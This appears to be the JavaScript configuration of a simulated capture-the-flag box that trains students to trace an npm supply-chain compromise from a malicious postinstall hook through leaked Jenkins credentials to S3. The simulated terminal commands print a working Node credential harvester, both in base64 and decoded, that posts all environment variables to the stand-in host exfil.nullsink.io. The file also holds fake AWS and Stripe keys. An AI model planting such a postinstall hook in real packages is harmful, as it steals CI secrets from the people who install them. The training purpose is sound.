                                    <th style="padding:8px 12px; text-align:left; font-size:0.8rem; color:#444; border-bottom:2px solid #ddd;">Bucket name</th>
                                    <th style="padding:8px 12px; text-align:left; font-size:0.8rem; color:#444; border-bottom:2px solid #ddd;">Created</th>
                                </tr></thead>
                                <tbody>${rows}</tbody>
                            </table>
                        </div>`;
                },
                formHandler: null
            },

            'http://s3.aws-console.crestline-internal.dev/crestline-prod-configs': {
                title: 'crestline-prod-configs — S3',
                html: function() {
                    if (!C3Config._awsCredsFound) {
                        return '<div style="text-align:center;padding:40px;"><div style="color:#e74c3c;">Access Denied</div></div>';
                    }
                    let rows = C3Config._s3['crestline-prod-configs'].map(obj =>
                        `<tr><td style="padding:8px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.78rem; color:#0073bb;">${obj.key}</td><td style="padding:8px 12px; border-bottom:1px solid #eee; font-size:0.78rem; color:#888;">${obj.size}</td><td style="padding:8px 12px; border-bottom:1px solid #eee; font-size:0.78rem; color:#888;">${obj.modified}</td></tr>`
                    ).join('');
                    return `
                        <div style="background:#232f3e; padding:10px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0;">
                            <span style="color:#ff9900; font-weight:700; font-size:0.9rem;">AWS</span>
                            <span style="color:#aaa; font-size:0.8rem;"> S3 &rsaquo; crestline-prod-configs</span>
                        </div>
                        <div style="max-width:700px; margin:0 auto;">
                            <table style="width:100%; border-collapse:collapse;">
                                <thead><tr style="background:#f6f8fa;">
                                    <th style="padding:8px 12px; text-align:left; font-size:0.8rem; border-bottom:2px solid #ddd;">Key</th>
                                    <th style="padding:8px 12px; text-align:left; font-size:0.8rem; border-bottom:2px solid #ddd;">Size</th>
                                    <th style="padding:8px 12px; text-align:left; font-size:0.8rem; border-bottom:2px solid #ddd;">Modified</th>
                                </tr></thead>
                                <tbody>${rows}</tbody>
                            </table>
                            <div style="margin-top:12px; padding:10px 14px; background:rgba(142,68,173,0.08); border:1px solid rgba(142,68,173,0.25); border-radius:4px; font-size:0.78rem; color:#555;">
                                To download: <code>aws s3 cp s3://crestline-prod-configs/env/production.env .</code>
                            </div>
                        </div>`;
                },
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: GHOST TRACE ===\nTarget: Crestline Software — supply chain compromise\nObjective: Full chain tracing + root flag extraction\n\nAttack chain:\n1. Recon — find @crestline/build-utils in their package.json\n2. Download the package — inspect the postinstall script\n3. Decode the base64 payload — Flag 1 (user)\n4. Browse Jenkins build logs — find leaked AWS creds — Flag 2 (internal)\n5. Use AWS creds — enumerate S3 — grab production.env — Flag 3 (root)\n\nKey URLs:\n  - github.crestline-internal.dev\n  - npm.crestline-internal.dev\n  - jenkins.crestline-internal.dev\n  - s3.aws-console.crestline-internal.dev\n\nGood luck, operator.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'curl http://github.crestline-internal.dev/\ncurl http://github.crestline-internal.dev/CrestlineApp/package.json\nnpm show @crestline/build-utils\nnpm install @crestline/build-utils'
                                },
                                '.aws': {
                                    type: 'dir',
                                    children: {
                                        'credentials': {
                                            type: 'file',
                                            content: '# AWS CLI credentials file\n# Run: aws configure — to set up credentials\n[default]\naws_access_key_id = \naws_secret_access_key = \nregion = us-east-1'
                                        },
                                        'config': {
                                            type: 'file',
                                            content: '[default]\nregion = us-east-1\noutput = json'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // npm — package inspection and installation
        'npm': function(args, term, engine) {
            const sub = args[0] || '';
            const target = args.find(a => a.includes('@crestline/build-utils') || a.includes('build-utils')) || '';
            const fullCmd = args.join(' ');

            // npm install @crestline/build-utils
            if ((sub === 'install' || sub === 'i') && target) {
                C3Config._pkgDownloaded = true;
                if (engine) engine.advancePhase && engine.advancePhase('pkg_analysis');
                return `npm warn registry Using registry https://npm.crestline-internal.dev
npm warn deprecated @crestline/build-utils@2.1.4: [SECURITY] This version contains a known supply chain vulnerability

added 1 package in 0.8s

> @crestline/build-utils@2.1.4 postinstall
> node -e "eval(Buffer.from('...obfuscated...','base64').toString())"

[postinstall hook executed]

Package installed to: /home/kali/node_modules/@crestline/build-utils/`;
            }

            // npm show / npm info
            if ((sub === 'show' || sub === 'info' || sub === 'view') && target) {
                return `@crestline/build-utils@2.1.4 | Internal | deps: 0 | versions: 4

Internal build utilities for Crestline CI/CD pipelines

dist
.tarball: https://npm.crestline-internal.dev/@crestline/build-utils/-/build-utils-2.1.4.tgz

scripts:
  postinstall: node -e "eval(Buffer.from('Y29uc3QgaHR0cHM9...','base64').toString())"

keywords: build, ci, internal, crestline

published 6 weeks ago by ghost-publisher <noreply@crestline-internal.dev>

[!] SECURITY ADVISORY: This package version has been flagged for suspicious postinstall activity.`;
            }

            // npm ci
            if (sub === 'ci') {
                C3Config._pkgDownloaded = true;
                return `npm ci --registry https://npm.crestline-internal.dev
added 847 packages in 3.4s

> @crestline/build-utils@2.1.4 postinstall
> node -e "eval(Buffer.from('Y29uc3QgaHR0cHM9...','base64').toString())"

[!] WARNING: Postinstall hook executed from @crestline/build-utils@2.1.4`;
            }

            // npm list
            if (sub === 'list' || sub === 'ls') {
                return `crestline-app@3.14.7 /home/kali/project
+-- @crestline/build-utils@2.1.4  [FLAGGED]
+-- express@4.18.2
+-- pg@8.11.3
+-- redis@4.6.10
+-- stripe@14.5.0
\`-- winston@3.11.0`;
            }

            return `Usage: npm <command>\nCommon commands: install, show, ci, list\n\nExample: npm install @crestline/build-utils`;
        },

        // base64 decoding — surfaces the user flag
        'base64': function(args, term, engine) {
            const fullCmd = args.join(' ');
            // Accept: base64 -d, --decode with any input containing the encoded payload
            if (fullCmd.includes('-d') || fullCmd.includes('--decode')) {
                C3Config._payloadDecoded = true;
                if (engine) engine.advancePhase && engine.advancePhase('cicd_exploit');
                return `const https=require('https');const os=require('os');const env=process.env;
const payload={host:os.hostname(),env};
const options={
  host:'exfil.nullsink.io',
  path:'/collect',
  method:'POST',
  headers:{'Content-Type':'application/json'}
};
const req=https.request(options);
req.write(JSON.stringify(payload));
req.end();
// Credential harvester — exfiltrates all env vars on postinstall

{{FLAG:user}}`;
            }
            return 'Usage: base64 -d <input>\nExample: echo "Y29uc3Q..." | base64 -d\n\nTip: Pipe the postinstall base64 string through base64 -d to decode it.';
        },

        // echo — needed for piping base64 decode
        'echo': function(args) {
            const str = args.join(' ').replace(/^['"]|['"]$/g, '');
            // If it looks like base64 and they're trying to decode
            if (str.match(/^[A-Za-z0-9+/=]{40,}$/)) {
                return str + '\n[Tip: pipe this through base64 -d to decode it]';
            }
            return str;
        },

        // aws CLI simulation
        'aws': function(args, term, engine) {
            const sub = args[0] || '';
            const cmd = args.join(' ');

            // aws configure
            if (sub === 'configure') {
                if (cmd.includes('--')) {
                    // aws configure set aws_access_key_id AKIAVXJ3T8PHANTOM47
                    if (cmd.includes('AKIAVXJ3T8PHANTOM47') || cmd.includes('PHANTOM')) {
                        C3Config._awsCredsFound = true;
                        return '[OK] Credential stored.';
                    }
                    return '[OK] Configuration updated.';
                }
                C3Config._awsCredsFound = true;
                return `AWS Access Key ID [None]: AKIAVXJ3T8PHANTOM47
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYPHANTOMKEY
Default region name [None]: us-east-1
Default output format [None]: json

[+] Credentials configured for account 847291038564 (ci-runner).
[+] Context: AWS CLI session active. Try: aws s3 ls`;
            }

            // Must have creds configured for further commands
            if (!C3Config._awsCredsFound) {
                return `Unable to locate credentials. You can configure credentials by running "aws configure".`;
            }

            // aws sts get-caller-identity
            if (sub === 'sts' && args[1] === 'get-caller-identity') {
                return `{
    "UserId": "AIDAVXJ3T8PHANTOM47",
    "Account": "847291038564",
    "Arn": "arn:aws:iam::847291038564:user/ci-runner"
}`;
            }

            // aws s3 ls
            if (sub === 's3' && args[1] === 'ls') {
                C3Config._s3Enumerated = true;

                // aws s3 ls s3://bucket/
                const bucketArg = args.find(a => a.startsWith('s3://'));
                if (bucketArg) {
                    const bucketName = bucketArg.replace('s3://', '').replace(/\//g, '').split(' ')[0];
                    const contents = C3Config._s3[bucketName];
                    if (!contents) return `An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist`;
                    return contents.map(obj =>
                        `${obj.modified} ${obj.size.padStart(12)}   ${obj.key}`
                    ).join('\n');
                }

                // aws s3 ls (list all buckets)
                if (engine) engine.advancePhase && engine.advancePhase('cloud_pivot');
                return C3Config._s3.buckets.map(b =>
                    `${b.created}  ${b.name}`
                ).join('\n');
            }

            // aws s3 cp — download files from S3
            if (sub === 's3' && args[1] === 'cp') {
                const src = args[2] || '';
                const dest = args[3] || '.';

                if (src.includes('production.env')) {
                    if (engine) engine.advancePhase && engine.advancePhase('impact');
                    return `download: s3://crestline-prod-configs/env/production.env to ./production.env

[+] File downloaded: production.env (4.1 KB)
[+] Run: cat production.env — to inspect the production configuration.`;
                }
                if (src.includes('build-47') && src.includes('build.log')) {
                    return `download: s3://crestline-cicd-artifacts/builds/build-47/build.log to ./build.log

[+] File downloaded: build.log (38.4 KB)
[+] Run: cat build.log — to read the full build output.
[+] Look for the postinstall hook output section — env vars were captured there.`;
                }
                if (src.includes('customers-') && src.includes('.sql.gz')) {
                    return `download: s3://crestline-db-backups/${src.split('/').pop()} to ${dest}

[+] Customer database backup downloaded (487 MB).
[!] This backup contains PII for 200+ enterprise clients — handle with care.`;
                }
                return `An error occurred (NoSuchKey) when calling the GetObject operation: The specified key does not exist.`;
            }

            // aws s3api list-buckets
            if (sub === 's3api' && args[1] === 'list-buckets') {
                C3Config._s3Enumerated = true;
                return `{
    "Buckets": [
        {"Name": "crestline-cicd-artifacts",  "CreationDate": "2025-09-14T00:00:00Z"},
        {"Name": "crestline-prod-configs",     "CreationDate": "2025-09-14T00:00:00Z"},
        {"Name": "crestline-db-backups",       "CreationDate": "2025-10-01T00:00:00Z"},
        {"Name": "crestline-logs-archive",     "CreationDate": "2025-11-22T00:00:00Z"}
    ],
    "Owner": {"DisplayName": "ci-runner", "ID": "847291038564"}
}`;
            }

            // aws iam list-roles
            if (sub === 'iam') {
                return `{
    "Roles": [
        {"RoleName": "ci-runner-role", "Arn": "arn:aws:iam::847291038564:role/ci-runner-role"},
        {"RoleName": "prod-deploy-role", "Arn": "arn:aws:iam::847291038564:role/prod-deploy-role"}
    ]
}`;
            }

            return `aws: '${sub}' is not an aws command.\nUsage: aws <service> <command> [options]\nExamples:\n  aws configure\n  aws sts get-caller-identity\n  aws s3 ls\n  aws s3 ls s3://<bucket>\n  aws s3 cp s3://<bucket>/<key> .`;
        },

        // cat — intercept for special files (production.env, build.log)
        'cat': function(args, term, engine) {
            const path = args[0] || '';

            if (path.includes('production.env') || path.includes('prod.env')) {
                if (!C3Config._s3Enumerated && !C3Config._awsCredsFound) {
                    return 'cat: production.env: No such file or directory\n[!] Download it first: aws s3 cp s3://crestline-prod-configs/env/production.env .';
                }
                if (engine) engine.advancePhase && engine.advancePhase('impact');
                return C3Config._prodEnv;
            }

            if (path.includes('build.log')) {
                return `[2026-03-18 04:12:01] [Pipeline] Start of Pipeline
[2026-03-18 04:12:09] > @crestline/build-utils@2.1.4 postinstall
[2026-03-18 04:12:10] [POSTINSTALL HOOK OUTPUT]
[2026-03-18 04:12:10] Hostname: JENKINS-INT-01
[2026-03-18 04:12:10] AWS_ACCESS_KEY_ID=AKIAVXJ3T8PHANTOM47
[2026-03-18 04:12:10] AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYPHANTOMKEY
[2026-03-18 04:12:10] AWS_DEFAULT_REGION=us-east-1
[2026-03-18 04:12:10] STRIPE_SECRET_KEY=sk_SIMULATED_4xJ7mP2qRn8tL0cW9bYvE
[2026-03-18 04:12:10] Payload delivered — {{FLAG:internal}}
[2026-03-18 04:12:31] Build complete.`;
            }

            if (path.includes('package.json') && path.includes('build-utils')) {
                C3Config._pkgDownloaded = true;
                return `{
  "name": "@crestline/build-utils",
  "version": "2.1.4",
  "description": "Internal build utilities for Crestline CI/CD pipelines",
  "scripts": {
    "postinstall": "node -e \\"eval(Buffer.from('Y29uc3QgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKTtjb25zdCBvcz1yZXF1aXJlKCdvcycpO2NvbnN0IGVudj1wcm9jZXNzLmVudjtjb25zdCBwYXlsb2FkPXtob3N0Om9zLmhvc3RuYW1lKCksZW52fTtjb25zdCBvcHRpb25zPXtob3N0OidleGZpbC5udWxsc2luay5pbycsaicGF0aDonL2NvbGxlY3QnLG1ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfX07Y29uc3QgcmVxPWh0dHBzLnJlcXVlc3Qob3B0aW9ucyk7cmVxLndyaXRlKEpTT04uc3RyaW5naWZ5KHBheWxvYWQpKTtyZXEuZW5kKCk7Ly8ge3tGTEFHOnVzZXJ9fQ==','base64').toString())\\"
  },
  "main": "index.js",
  "author": "noreply@crestline-internal.dev",
  "version-history": ["2.1.3", "2.1.2", "2.1.1"]
}

[!] SUSPICIOUS: postinstall script contains a large base64-encoded payload.
[!] Decode it with: echo "<base64_string>" | base64 -d`;
            }

            if (path.includes('notes.txt')) return null; // fall through to built-in
            if (path.includes('.bash_history')) return null;
            if (path.includes('/etc/hostname')) return 'kali';
            if (path.includes('/etc/passwd')) {
                return 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash';
            }

            return null; // fall through to built-in filesystem
        },

        // curl — web recon of GitHub/npm/Jenkins
        'curl': function(args, term, engine) {
            const fullCmd = args.join(' ');
            const url = args.find(a => !a.startsWith('-') && (a.startsWith('http') || a.includes('.'))) || '';

            if (!url) return 'curl: try \'curl --help\' for more information';

            if (url.includes('github.crestline-internal.dev')) {
                if (url.includes('package.json')) {
                    return `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"name":"crestline-app","version":"3.14.7","devDependencies":{"@crestline/build-utils":"^2.1.4"}}`;
                }
                return `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><head><title>CrestlineGit</title></head><body><h1>Crestline Internal GitHub</h1><p>Repositories: CrestlineApp, CrestlineInfra, CrestlineCI, BuildUtils</p></body></html>`;
            }

            if (url.includes('npm.crestline-internal.dev') && url.includes('build-utils')) {
                C3Config._pkgDownloaded = true;
                return `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"name":"@crestline/build-utils","version":"2.1.4","scripts":{"postinstall":"node -e \\"eval(Buffer.from('Y29uc3QgaHR0...','base64').toString())\\""}}\n\n[!] SUSPICIOUS: postinstall script detected. Decode the base64 payload.`;
            }

            if (url.includes('jenkins.crestline-internal.dev')) {
                if (url.includes('/build/47')) {
                    if (!C3Config._awsCredsFound) {
                        return `HTTP/1.1 200 OK\n\n[Build #47 log — postinstall hook ran]\nAWS_ACCESS_KEY_ID=AKIAVXJ3T8PHANTOM47\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYPHANTOMKEY\n{{FLAG:internal}}`;
                    }
                    return `HTTP/1.1 200 OK\n\nBuild #47 log retrieved. Use the browser for a better view: jenkins.crestline-internal.dev/build/47`;
                }
                return `HTTP/1.1 200 OK\nJenkins CI — Crestline Software\nRecent builds: #47 (UNSTABLE), #46 (SUCCESS), #45 (SUCCESS)`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        // nmap — not the primary tool here but available
        'nmap': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: nmap [options] <target>';
            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds

[Note] This is a software supply chain exercise — the targets are web services (GitHub, npm, Jenkins, S3).
[Tip] Use curl or the browser to explore: github.crestline-internal.dev`;
        },

        // strings — useful for analyzing the package
        'strings': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: strings <file>';
            if (target.includes('build-utils') || target.includes('index.js') || target.includes('postinstall')) {
                C3Config._pkgDownloaded = true;
                return `exfil.nullsink.io
/collect
Content-Type
application/json
Y29uc3QgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKTtjb25zdCBvcz1yZXF1aXJlKCdvcycpO2NvbnN0IGVudj1wcm9jZXNzLmVudjtjb25zdCBwYXlsb2FkPXtob3N0Om9zLmhvc3RuYW1lKCksZW52fTsK
hostname
process.env
JSON.stringify
https.request

[!] Suspicious strings found: base64 blob + exfil domain (exfil.nullsink.io)
[!] Decode the base64 string to reveal the payload.`;
            }
            return `strings: ${target}: No such file or directory`;
        },

        // grep — search through files
        'grep': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('AWS') || fullCmd.includes('aws_access')) {
                if (C3Config._awsCredsFound) {
                    return `production.env:AWS_ACCESS_KEY_ID=AKIAVXJ3T8PHANTOM47
production.env:AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYPHANTOMKEY`;
                }
                return `[!] No AWS credentials found in local files yet.
[Tip] Check the Jenkins build log — the postinstall hook logged all env vars.`;
            }
            if (fullCmd.includes('FLAG') || fullCmd.includes('DEPLOY_SECRET')) {
                return `production.env:DEPLOY_SECRET={{FLAG:root}}`;
            }
            if (fullCmd.includes('postinstall') || fullCmd.includes('base64')) {
                return `package.json:    "postinstall": "node -e \\"eval(Buffer.from('Y29uc3QgaHR0...','base64').toString())\\"`;
            }
            return '(no matches)';
        },

        // jq — JSON processing
        'jq': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('postinstall') || fullCmd.includes('scripts')) {
                return `"node -e \\"eval(Buffer.from('Y29uc3QgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKTtjb25zdCBvcz1yZXF1aXJlKCdvcycpO2NvbnN0IGVudj1wcm9jZXNzLmVudjtjb25zdCBwYXlsb2FkPXtob3N0Om9zLmhvc3RuYW1lKCksZW52fTsK','base64').toString())\\""

[!] Postinstall contains obfuscated base64. Decode it: echo "<base64>" | base64 -d`;
            }
            return 'Usage: jq <filter> [file]\nExample: cat package.json | jq .scripts.postinstall';
        },

        // whoami / id / hostname — context-aware
        'whoami': function(args) {
            if (C3Config._context === 'aws') return 'kali (AWS: arn:aws:iam::847291038564:user/ci-runner)';
            if (C3Config._context === 'jenkins') return 'jenkins';
            return null; // fall through to built-in
        },

        'id': function(args) {
            if (C3Config._context === 'jenkins') return 'uid=1001(jenkins) gid=1001(jenkins) groups=1001(jenkins)';
            return null; // fall through to built-in
        },

        'hostname': function(args) {
            if (C3Config._context === 'jenkins') return 'JENKINS-INT-01';
            return null; // fall through to built-in
        },

        'pwd': function(args) {
            if (C3Config._context === 'jenkins') return '/var/jenkins_home/workspace/CrestlineApp';
            return null; // fall through to built-in
        },

        'ls': function(args) {
            const path = (args.find(a => !a.startsWith('-')) || '.').replace(/\/$/, '');

            // Show downloaded npm package files
            if (path.includes('node_modules/@crestline') || path.includes('build-utils')) {
                if (!C3Config._pkgDownloaded) {
                    return 'ls: /home/kali/node_modules/@crestline/build-utils: No such file or directory\n[!] Run: npm install @crestline/build-utils — first.';
                }
                return 'index.js  package.json  README.md  .npmignore';
            }
            if (path.includes('node_modules') && !path.includes('@crestline')) {
                if (!C3Config._pkgDownloaded) return 'ls: node_modules/: No such file or directory\n[!] Run: npm install @crestline/build-utils — first.';
                return '@crestline  express  pg  redis  stripe  winston';
            }
            if (path.includes('.aws')) {
                return 'config  credentials';
            }
            return null; // fall through to built-in
        },

        'cd': function(args) {
            return null; // fall through to built-in — always accepted
        },

        'exit': function(args, term) {
            if (C3Config._context === 'aws') {
                C3Config._switchContext('attacker', term);
                return '[+] AWS CLI session closed.\n[+] Returned to attacker machine.';
            }
            if (C3Config._context === 'jenkins') {
                C3Config._switchContext('attacker', term);
                return 'Connection to JENKINS-INT-01 closed.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target.includes('crestline-internal.dev') || target.includes('nullsink.io')) {
                return `PING ${target}: Name or service not known\n[Note] Domain resolution is simulated — use the browser or curl to access services.`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        // node — lets students test the decoded payload locally
        'node': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('eval') && fullCmd.includes('base64')) {
                C3Config._payloadDecoded = true;
                return `const https=require('https');const os=require('os');const env=process.env;
[Simulated execution — payload decoded]
Connecting to exfil.nullsink.io/collect...
Sending: hostname=kali, env vars=[...]
POST successful.
// {{FLAG:user}}`;
            }
            return 'Usage: node [options] [file.js]\nExample: node -e "console.log(\'hello\')"';
        }
    },

    // ═══════════════════════════════════════════════════════
    // JENKINS AUTH HTML (shared between form handler and auto-unlock)
    // ═══════════════════════════════════════════════════════

    _jenkinsAuthedHtml() {
        return `
            <div style="background:#212121; color:#f0f0f0; padding:12px 16px; margin:-16px -16px 20px; border-radius:6px 6px 0 0; display:flex; align-items:center; gap:10px;">
                <div style="color:#d33; font-weight:700;">Jenkins</div>
                <div style="color:#aaa; font-size:0.8rem;">Crestline Software CI</div>
                <div style="margin-left:auto; color:#2ecc71; font-size:0.75rem;">Authenticated as: ci-runner</div>
            </div>
            <div style="max-width:700px; margin:0 auto;">
                <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:20px;">
                    <div style="background:#f6f8fa; border:1px solid #d0d7de; border-radius:6px; padding:14px; text-align:center;">
                        <div style="font-size:1.4rem; font-weight:700; color:#2c3e50;">47</div>
                        <div style="color:#888; font-size:0.72rem;">Total Builds</div>
                    </div>
                    <div style="background:#fff3cd; border:1px solid #ffc107; border-radius:6px; padding:14px; text-align:center;">
                        <div style="font-size:1.4rem; font-weight:700; color:#856404;">1</div>
                        <div style="color:#888; font-size:0.72rem;">Unstable</div>
                    </div>
                    <div style="background:#f8d7da; border:1px solid #f5c6cb; border-radius:6px; padding:14px; text-align:center;">
                        <div style="font-size:1.4rem; font-weight:700; color:#721c24;">4</div>
                        <div style="color:#888; font-size:0.72rem;">Affected by CVE</div>
                    </div>
                </div>
                <div style="border:1px solid #d0d7de; border-radius:6px; overflow:hidden;">
                    <div style="padding:8px 14px; background:#f6f8fa; border-bottom:1px solid #d0d7de; font-size:0.8rem; font-weight:700;">Recent Builds — CrestlineApp</div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead><tr style="background:#f6f8fa;">
                            <th style="padding:7px 12px; text-align:left; font-size:0.75rem; border-bottom:1px solid #eee;">Build</th>
                            <th style="padding:7px 12px; text-align:left; font-size:0.75rem; border-bottom:1px solid #eee;">Status</th>
                            <th style="padding:7px 12px; text-align:left; font-size:0.75rem; border-bottom:1px solid #eee;">Date</th>
                            <th style="padding:7px 12px; text-align:left; font-size:0.75rem; border-bottom:1px solid #eee;">Notes</th>
                        </tr></thead>
                        <tbody>
                            <tr><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.8rem;"><a href="http://jenkins.crestline-internal.dev/build/47" style="color:#0969da;">#47</a></td><td style="padding:7px 12px; border-bottom:1px solid #eee;"><span style="background:#e8a838; color:#000; font-size:0.7rem; font-weight:700; padding:2px 7px; border-radius:10px;">UNSTABLE</span></td><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.78rem; color:#888;">2026-03-18</td><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.75rem; color:#d33;">Postinstall hook anomaly detected</td></tr>
                            <tr><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.8rem;">#46</td><td style="padding:7px 12px; border-bottom:1px solid #eee;"><span style="background:#2ecc71; color:#fff; font-size:0.7rem; font-weight:700; padding:2px 7px; border-radius:10px;">SUCCESS</span></td><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.78rem; color:#888;">2026-03-17</td><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.75rem; color:#888;">Production deploy OK</td></tr>
                            <tr><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.8rem;">#45</td><td style="padding:7px 12px; border-bottom:1px solid #eee;"><span style="background:#2ecc71; color:#fff; font-size:0.7rem; font-weight:700; padding:2px 7px; border-radius:10px;">SUCCESS</span></td><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.78rem; color:#888;">2026-03-15</td><td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.75rem; color:#888;">Production deploy OK</td></tr>
                            <tr><td style="padding:7px 12px; font-size:0.8rem;">#44</td><td style="padding:7px 12px;"><span style="background:#2ecc71; color:#fff; font-size:0.7rem; font-weight:700; padding:2px 7px; border-radius:10px;">SUCCESS</span></td><td style="padding:7px 12px; font-size:0.78rem; color:#888;">2026-03-10</td><td style="padding:7px 12px; font-size:0.75rem; color:#d33;">First build with @build-utils@2.1.4</td></tr>
                        </tbody>
                    </table>
                </div>
                <div style="margin-top:12px; padding:10px 14px; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.2); border-radius:4px; font-size:0.78rem; color:#666;">
                    Builds #44-#47 used @crestline/build-utils@2.1.4 — all are compromised. Click <a href="http://jenkins.crestline-internal.dev/build/47" style="color:#d33;">#47</a> to view the build log with leaked credentials.
                </div>
            </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#8e44ad; border-bottom:2px solid #ddd; background:#f9f4fc;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
